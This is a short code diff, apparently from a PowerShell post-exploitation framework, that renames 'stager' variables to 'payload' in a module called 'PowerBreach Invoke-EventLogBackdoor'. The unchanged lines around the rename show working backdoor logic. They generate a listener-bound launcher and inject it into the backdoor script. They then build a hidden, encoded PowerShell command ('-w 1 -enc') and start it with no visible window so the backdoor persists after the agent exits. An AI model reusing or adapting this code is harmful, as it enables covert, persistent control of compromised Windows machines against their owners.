@@ -124,17 +124,17 @@ Invoke-EventLogBackdoor"""
 
         else:
             # set the listener value for the launcher
-            stager = self.mainMenu.stagers.stagers["multi/launcher"]
-            stager.options['Listener']['Value'] = listenerName
-            stager.options['Base64']['Value'] = "False"
+            payload = self.mainMenu.payloads.payloads["multi/launcher"]
+            payload.options['Listener']['Value'] = listenerName
+            payload.options['Base64']['Value'] = "False"
 
             # and generate the code
-            stagerCode = stager.generate()
+            payloadCode = payload.generate()
 
-            if stagerCode == "":
+            if payloadCode == "":
                 return ""
             else:
-                script = script.replace("REPLACE_LAUNCHER", stagerCode)
+                script = script.replace("REPLACE_LAUNCHER", payloadCode)
                 script = script.encode('ascii', 'ignore')
         
         for option,values in self.options.iteritems():
@@ -165,8 +165,8 @@ Invoke-EventLogBackdoor"""
         # so it survives the agent exiting  
         modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
         launcher = helpers.powershell_launcher(script, modifiable_launcher)
-        stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-        parts = stagerCode.split(" ")
+        payloadCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
+        parts = payloadCode.split(" ")
 
         # set up the start-process command so no new windows appears
         scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
